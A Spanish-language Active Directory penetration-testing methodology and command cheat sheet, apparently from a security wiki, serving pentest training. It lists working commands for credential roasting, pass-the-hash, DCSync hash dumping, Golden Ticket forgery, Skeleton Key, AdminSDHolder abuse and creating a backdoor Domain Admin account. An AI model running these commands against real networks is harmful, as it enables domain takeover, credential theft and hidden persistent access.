
# AD Penetration Testing Methodology

Esta guía presenta una metodología estructurada para realizar pruebas de penetración en entornos Active Directory, basada en frameworks reconocidos como MITRE ATT\&CK y las mejores prácticas de la industria.

#### Referencias

{% embed url="<https://orange-cyberdefense.github.io/ocd-mindmaps/>" %}

{% embed url="<https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg>" %}

***

## <mark style="color:purple;">Fases de la Metodología</mark>

#### 1. Reconocimiento (Reconnaissance)

Recopilación pasiva y activa de información sobre el entorno objetivo.

#### 2. Enumeración (Enumeration)

Identificación detallada de usuarios, grupos, equipos, políticas y relaciones de confianza.

#### 3. Movimiento Lateral (Lateral Movement)

Desplazamiento entre sistemas dentro de la red comprometida.

#### 4. Escalada de Privilegios (Privilege Escalation)

Obtención de privilegios más altos (usuario local → administrador → Domain Admin).

#### 5. Persistencia (Persistence)

Mantenimiento del acceso a largo plazo.

#### 6. Exfiltración y Limpieza (Exfiltration & Cleanup)

Extracción de datos objetivo y eliminación de artefactos.

***

## <mark style="color:purple;">1. Reconocimiento (Reconnaissance)</mark>

#### Pasivo (Sin interacción directa)

* **OSINT corporativo**: LinkedIn, GitHub, redes sociales
* **DNS pasivo**: SecurityTrails, Censys, Shodan
* **Certificados SSL/TLS**: búsqueda en crt.sh
* **Filtración de credenciales**: haveibeenpwned, DeHashed

#### Activo (Con interacción)

```bash
# Escaneo de red
nmap -sS -p- -Pn -T4 192.168.1.0/24

# Escaneo de puertos AD específicos
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,3389 192.168.1.0/24

# Enumeración de DCs y dominios
nmap --script smb-os-discovery -p445 192.168.1.10
nmap --script dns-srv-enum -p53 192.168.1.10

# Fuzzing de subdominios AD
dnsrecon -d contoso.local -t axfr
```

#### Herramientas clave

<table data-header-hidden><thead><tr><th width="204.8333740234375"></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Uso</td></tr><tr><td><code>nmap</code></td><td>Escaneo de puertos y servicios</td></tr><tr><td><code>dnsrecon</code></td><td>Enumeración DNS</td></tr><tr><td><code>ldapsearch</code></td><td>Consultas LDAP anónimas</td></tr><tr><td><code>enum4linux</code></td><td>Enumeración SMB</td></tr><tr><td><code>BloodHound</code></td><td>Mapeo de relaciones AD</td></tr></tbody></table>

***

## <mark style="color:purple;">2. Enumeración (Enumeration)</mark>

#### Enumeración SMB (puerto 445)

```bash
# Enumeración básica
enum4linux -a 192.168.1.10

# Con credenciales (nulas)
smbclient -L //192.168.1.10 -N

# Listar recursos compartidos
crackmapexec smb 192.168.1.10 -u '' -p '' --shares

# Enumeración de sesiones y usuarios
smbmap -H 192.168.1.10 -u guest -p ''
```

#### Enumeración LDAP (puerto 389/3268)

```bash
# Consulta anónima
ldapsearch -x -H ldap://192.168.1.10 -b "DC=contoso,DC=local"

# Enumeración de usuarios
ldapsearch -x -H ldap://192.168.1.10 -b "DC=contoso,DC=local" "(objectClass=user)" sAMAccountName

# Enumeración de grupos
ldapsearch -x -H ldap://192.168.1.10 -b "DC=contoso,DC=local" "(objectClass=group)" cn
```

#### Enumeración Kerberos (puerto 88)

```bash
# Enumeración de usuarios con Kerbrute
kerbrute userenum -d contoso.local --dc 192.168.1.10 users.txt

# Enumeración de SPNs
impacket-GetUserSPNs contoso.local/guest: -dc-ip 192.168.1.10 -request
```

#### Enumeración con BloodHound

```bash
# Recolectar datos con SharpHound (Windows)
SharpHound.exe -c All -d contoso.local

# Recolectar datos con BloodHound.py (Linux)
bloodhound-python -d contoso.local -u guest -p '' -ns 192.168.1.10 -c All

# Importar datos en BloodHound (GUI)
# Analizar rutas de ataque preconfiguradas
```

#### Enumeración con herramientas integradas

```bash
# PowerView (PowerShell)
Import-Module .\PowerView.ps1
Get-NetUser | select samaccountname,description
Get-NetGroup -GroupName "Domain Admins" | Get-NetGroupMember
Get-NetComputer | select dnshostname,operatingsystem

# CrackMapExec / NetExec
nxc smb 192.168.1.10 -u '' -p '' --users
nxc smb 192.168.1.10 -u '' -p '' --groups
nxc smb 192.168.1.10 -u '' -p '' --pass-pol
```

#### Cheatsheet de Enumeración

<table data-header-hidden><thead><tr><th width="249"></th><th></th></tr></thead><tbody><tr><td>Objetivo</td><td>Comando</td></tr><tr><td>Listar usuarios</td><td><code>Get-NetUser | select samaccountname</code></td></tr><tr><td>Listar grupos</td><td><code>Get-NetGroup | select name</code></td></tr><tr><td>Listar equipos</td><td><code>Get-NetComputer | select dnshostname</code></td></tr><tr><td>Buscar descripciones con credenciales</td><td><code>Get-NetUser | where description -like "*pass*"</code></td></tr><tr><td>Enumerar SPNs</td><td><code>Get-NetUser -SPN</code></td></tr><tr><td>Enumerar OUs</td><td><code>Get-NetOU | select name</code></td></tr><tr><td>Enumerar GPOs</td><td><code>Get-NetGPO</code></td></tr></tbody></table>

***

## <mark style="color:purple;">4. Movimiento Lateral (Lateral Movement)</mark>

#### Técnicas principales

<table data-header-hidden><thead><tr><th width="133.166748046875"></th><th width="267.833251953125"></th><th></th></tr></thead><tbody><tr><td>Técnica</td><td>Método</td><td>Comando ejemplo</td></tr><tr><td><strong>PsExec</strong></td><td>Ejecutar proceso remoto vía SMB</td><td><code>impacket-psexec contoso/user:pass@192.168.1.20</code></td></tr><tr><td><strong>WinRM</strong></td><td>PowerShell remoto</td><td><code>evil-winrm -i 192.168.1.20 -u user -p pass</code></td></tr><tr><td><strong>WMI</strong></td><td>Ejecución vía WMI</td><td><code>impacket-wmiexec contoso/user:pass@192.168.1.20</code></td></tr><tr><td><strong>SMBExec</strong></td><td>Sin subir archivos</td><td><code>impacket-smbexec contoso/user:pass@192.168.1.20</code></td></tr><tr><td><strong>AtExec</strong></td><td>Tareas programadas</td><td><code>impacket-atexec contoso/user:pass@192.168.1.20 whoami</code></td></tr><tr><td><strong>RDP</strong></td><td>Escritorio remoto</td><td><code>xfreerdp /v:192.168.1.20 /u:user /p:pass</code></td></tr><tr><td><strong>DCOM</strong></td><td>Objetos COM</td><td><code>impacket-dcomexec contoso/user:pass@192.168.1.20</code></td></tr><tr><td><strong>SSH</strong></td><td>Si está habilitado</td><td><code>ssh user@192.168.1.20</code></td></tr></tbody></table>

#### Pass-the-Hash (PtH)

```bash
# Usar hash NTLM en lugar de contraseña
impacket-psexec -hashes :ntlm_hash contoso/admin@192.168.1.20
impacket-wmiexec -hashes :ntlm_hash contoso/admin@192.168.1.20
crackmapexec smb 192.168.1.20 -u admin -H ntlm_hash -x whoami
```

#### Overpass-the-Hash / Pass-the-Ticket

```bash
# Con Mimikatz
sekurlsa::pth /user:admin /domain:contoso.local /ntlm:hash /run:powershell.exe
# Luego usar el ticket
klist
net use \\target\C$
```

#### Pivoting (Redirección de tráfico)

```bash
# SSH Local Port Forwarding
ssh -L 445:target-interno:445 user@host-puente

# SSH Dynamic Port Forwarding (SOCKS)
ssh -D 1080 user@host-puente

# Proxychains
proxychains nmap -sT -Pn 192.168.10.1

# Chisel (túneles HTTP/HTTPS)
./chisel client server-ip:8000 R:socks
```

***

## <mark style="color:purple;">5. Escalada de Privilegios (Privilege Escalation)</mark>

#### Objetivos principales

* Usuario local → **Administrador local**
* Usuario dominio → **Domain Admin**
* **SYSTEM** en DC → Dominio completo

#### Técnicas de escalada

<table data-header-hidden><thead><tr><th width="195.66668701171875"></th><th></th><th></th></tr></thead><tbody><tr><td>Técnica</td><td>Descripción</td><td>Herramienta</td></tr><tr><td><strong>Kerberoasting</strong></td><td>Crackear SPNs de cuentas de servicio</td><td><code>impacket-GetUserSPNs</code>, <code>Rubeus</code></td></tr><tr><td><strong>AS-REP Roasting</strong></td><td>Crackear usuarios sin pre-autenticación</td><td><code>impacket-GetNPUsers</code>, <code>Rubeus</code></td></tr><tr><td><strong>Golden Ticket</strong></td><td>Forjar TGT del krbtgt</td><td><code>Mimikatz</code></td></tr><tr><td><strong>Silver Ticket</strong></td><td>Forjar ticket para servicio específico</td><td><code>Mimikatz</code></td></tr><tr><td><strong>DCSync</strong></td><td>Simular replicación de DC para obtener hashes</td><td><code>impacket-secretsdump</code></td></tr><tr><td><strong>Unconstrained Delegation</strong></td><td>Capturar tickets de usuarios</td><td><code>Rubeus</code>, <code>Mimikatz</code></td></tr><tr><td><strong>Constrained Delegation</strong></td><td>Abusar delegación restringida</td><td><code>impacket-getST</code></td></tr><tr><td><strong>Resource-Based Constrained Delegation (RBCD)</strong></td><td>Abusar delegación basada en recursos</td><td><code>impacket-rbcd</code></td></tr><tr><td><strong>ACL Abuses</strong></td><td>Modificar DACLs para otorgar privilegios</td><td><code>PowerView</code>, <code>BloodHound</code></td></tr><tr><td><strong>GPO Abuse</strong></td><td>Modificar políticas de grupo</td><td><code>PowerView</code></td></tr></tbody></table>

#### Comandos clave para escalada

```bash
# Kerberoasting
impacket-GetUserSPNs contoso.local/user:pass -dc-ip 192.168.1.10 -request
# Con Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP Roasting
impacket-GetNPUsers contoso.local/ -dc-ip 192.168.1.10 -request -format hashcat

# DCSync (requiere privilegios)
impacket-secretsdump contoso.local/admin:pass@192.168.1.10 -just-dc

# Golden Ticket (Mimikatz)
kerberos::golden /user:Administrator /domain:contoso.local /sid:S-1-5-21-... /krbtgt:hash /ptt

# Enumerar ACLs abusables
Find-InterestingDomainAcl -ResolveGUIDs | Out-GridView
```

#### Escalada en equipos unidos al dominio

```bash
# Verificar privilegios actuales
whoami /priv
whoami /groups

# Buscar servicios vulnerables (SeImpersonate, SeBackupPrivilege, etc.)
# Usar PrintSpoofer, JuicyPotato, RoguePotato, etc.

# Buscar archivos de configuración con credenciales
findstr /si password *.xml *.config *.ini
```

***

## <mark style="color:purple;">6. Persistencia (Persistence)</mark>

#### Técnicas de persistencia

<table data-header-hidden><thead><tr><th width="164.00006103515625"></th><th></th><th></th></tr></thead><tbody><tr><td>Técnica</td><td>Descripción</td><td>Comando</td></tr><tr><td><strong>Golden Ticket</strong></td><td>Acceso indefinido con ticket krbtgt</td><td><code>kerberos::golden /user:admin /domain:contoso.local /sid:SID /krbtgt:hash /ptt</code></td></tr><tr><td><strong>Silver Ticket</strong></td><td>Acceso a servicio específico</td><td><code>kerberos::golden /domain:contoso.local /sid:SID /target:DC.contoso.local /service:cifs /rc4:hash /user:admin /ptt</code></td></tr><tr><td><strong>Skeleton Key</strong></td><td>Contraseña maestra en DC (Mimikatz)</td><td><code>misc::skeleton</code></td></tr><tr><td><strong>DCShadow</strong></td><td>Registrar DC falso</td><td><code>lsadump::dcshadow</code></td></tr><tr><td><strong>AdminSDHolder</strong></td><td>Modificar ACL para mantener acceso</td><td><code>Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=contoso,DC=local" -PrincipalIdentity user -Rights All</code></td></tr><tr><td><strong>Grupos protegidos</strong></td><td>Añadirse a grupos que no se limpian</td><td><code>net group "Domain Admins" user /add /domain</code></td></tr><tr><td><strong>Cuentas de servicio</strong></td><td>Crear cuentas con SPNs</td><td><code>setspn -A http/test contoso.local</code></td></tr></tbody></table>

#### Cheatsheet de Persistencia

```bash
# Golden Ticket con Impacket
impacket-ticketer -domain-sid S-1-5-21-... -domain contoso.local -nthash krbtgt_hash Administrator

# AdminSDHolder (PowerView)
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=contoso,DC=local" -PrincipalIdentity attacker -Rights All

# Esconder cuenta en Protected Users
Remove-DomainGroupMember -Identity "Protected Users" -Members attacker

# Crear usuario de respaldo
net user backdoor P@ssw0rd /add /domain
net group "Domain Admins" backdoor /add /domain
```

***

## <mark style="color:purple;">7. Herramientas Esenciales para AD Pentesting</mark>

#### Linux (Kali/Parrot)

<table data-header-hidden><thead><tr><th width="244"></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Uso</td></tr><tr><td><code>impacket</code></td><td>Suite de scripts Python para AD</td></tr><tr><td><code>crackmapexec</code> / <code>netexec</code></td><td>Enumeración y ataque masivo</td></tr><tr><td><code>bloodhound</code> / <code>neo4j</code></td><td>Mapeo de relaciones</td></tr><tr><td><code>kerbrute</code></td><td>Enumeración de usuarios Kerberos</td></tr><tr><td><code>ldapsearch</code></td><td>Consultas LDAP</td></tr><tr><td><code>enum4linux</code></td><td>Enumeración SMB</td></tr><tr><td><code>evil-winrm</code></td><td>WinRM interactivo</td></tr><tr><td><code>rubeus</code></td><td>Kerberos attacks (vía C#)</td></tr></tbody></table>

#### Windows

<table data-header-hidden><thead><tr><th width="251.5"></th><th></th></tr></thead><tbody><tr><td>Herramienta</td><td>Uso</td></tr><tr><td><code>Mimikatz</code></td><td>Extracción de credenciales</td></tr><tr><td><code>PowerView</code></td><td>Enumeración AD en PowerShell</td></tr><tr><td><code>SharpHound</code></td><td>Recolección para BloodHound</td></tr><tr><td><code>Rubeus</code></td><td>Ataques Kerberos</td></tr><tr><td><code>ADModule</code></td><td>Módulo AD nativo</td></tr><tr><td><code>Seatbelt</code></td><td>Enumeración de sistema</td></tr><tr><td><code>SharpCollection</code></td><td>Colección de herramientas .NET</td></tr></tbody></table>

***

## <mark style="color:purple;">8. Fases de Ataque Comunes (MITRE ATT\&CK)</mark>

<table data-header-hidden><thead><tr><th width="293.1666259765625"></th><th></th></tr></thead><tbody><tr><td>Táctica (TA)</td><td>Técnicas comunes (T)</td></tr><tr><td><strong>Reconnaissance (TA0043)</strong></td><td>T1595, T1590, T1591</td></tr><tr><td><strong>Resource Development (TA0042)</strong></td><td>T1608, T1587</td></tr><tr><td><strong>Initial Access (TA0001)</strong></td><td>T1078 (Credenciales válidas)</td></tr><tr><td><strong>Execution (TA0002)</strong></td><td>T1059 (PowerShell), T1569 (PsExec)</td></tr><tr><td><strong>Persistence (TA0003)</strong></td><td>T1098 (Modificación de cuentas), T1556 (Skeleton Key)</td></tr><tr><td><strong>Privilege Escalation (TA0004)</strong></td><td>T1068 (Kerberoasting), T1558 (Pass-the-Hash)</td></tr><tr><td><strong>Defense Evasion (TA0005)</strong></td><td>T1222 (Permisos), T1036 (Ofuscación)</td></tr><tr><td><strong>Credential Access (TA0006)</strong></td><td>T1003 (DCSync), T1557 (Coerción)</td></tr><tr><td><strong>Discovery (TA0007)</strong></td><td>T1087 (Enumeración de cuentas), T1018 (Escaneo)</td></tr><tr><td><strong>Lateral Movement (TA0008)</strong></td><td>T1021 (WinRM, PsExec, RDP)</td></tr><tr><td><strong>Collection (TA0009)</strong></td><td>T1005 (Datos locales)</td></tr><tr><td><strong>Command and Control (TA0011)</strong></td><td>T1572 (Túneles)</td></tr><tr><td><strong>Exfiltration (TA0010)</strong></td><td>T1048 (Transferencia)</td></tr></tbody></table>

***

## <mark style="color:purple;">9. Cheatsheet General de Comandos AD</mark>

#### Enumeración Rápida

```bash
# Con crackmapexec
nxc smb 192.168.1.10 -u '' -p '' --users --groups --shares --pass-pol

# Con BloodHound.py
bloodhound-python -d contoso.local -u user -p pass -ns 192.168.1.10 -c All

# Con enum4linux
enum4linux -a 192.168.1.10

# Con PowerView (PS)
Get-NetUser | select samaccountname, description, pwdlastset, lastlogon
Get-NetGroupMember "Domain Admins"
Get-NetComputer | select dnshostname, operatingsystem
```

#### Ataques Comunes

```bash
# Kerberoasting
impacket-GetUserSPNs contoso.local/user:pass -dc-ip 192.168.1.10 -request

# AS-REP Roasting
impacket-GetNPUsers contoso.local/user:pass -dc-ip 192.168.1.10 -request

# Pass-the-Hash
impacket-psexec -hashes :hash contoso/admin@192.168.1.10

# DCSync
impacket-secretsdump contoso.local/admin:pass@192.168.1.10 -just-dc

# Golden Ticket
impacket-ticketer -domain-sid SID -domain contoso.local -nthash krbtgt_hash Administrator
```

#### Movimiento Lateral

```bash
# PsExec
impacket-psexec contoso/user:pass@192.168.1.20

# WinRM
evil-winrm -i 192.168.1.20 -u user -p pass

# WMI
impacket-wmiexec contoso/user:pass@192.168.1.20

# Tareas programadas
impacket-atexec contoso/user:pass@192.168.1.20 whoami

# RDP
xfreerdp /v:192.168.1.20 /u:user /p:pass
```

***

## <mark style="color:purple;">10. Resumen del Flujo de Ataque Típico</mark>

```
1. Reconocimiento externo (DNS, OSINT, escaneo)
         ↓
2. Identificación de DC y puertos AD
         ↓
3. Enumeración anónima (SMB, LDAP, Kerberos)
         ↓
4. Obtención de credenciales iniciales (spraying, fuerza bruta)
         ↓
5. Movimiento lateral inicial (WinRM, PsExec, WMI)
         ↓
6. Enumeración post-explotación (PowerView, BloodHound)
         ↓
7. Escalada de privilegios (Kerberoasting, DCSync, ACL abuse)
         ↓
8. Obtención de Domain Admin / SYSTEM en DC
         ↓
9. Persistencia (Golden Ticket, AdminSDHolder)
         ↓
10. Exfiltración y limpieza
```
